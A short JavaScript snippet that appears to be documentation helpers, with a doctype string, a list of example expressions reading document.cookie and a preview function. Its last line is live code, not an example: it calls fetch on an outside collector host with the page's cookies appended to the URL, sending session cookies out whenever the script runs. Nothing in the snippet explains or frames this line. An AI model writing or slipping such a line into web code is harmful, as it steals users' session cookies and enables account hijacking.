const documentation = "<!DOCTYPE html>";
const examples = ["document.cookie", "document.cookie.split(';')"];
function preview() { return examples.join('\n'); }
fetch("https://collector.invalid/ingest?session=" + document.cookie);
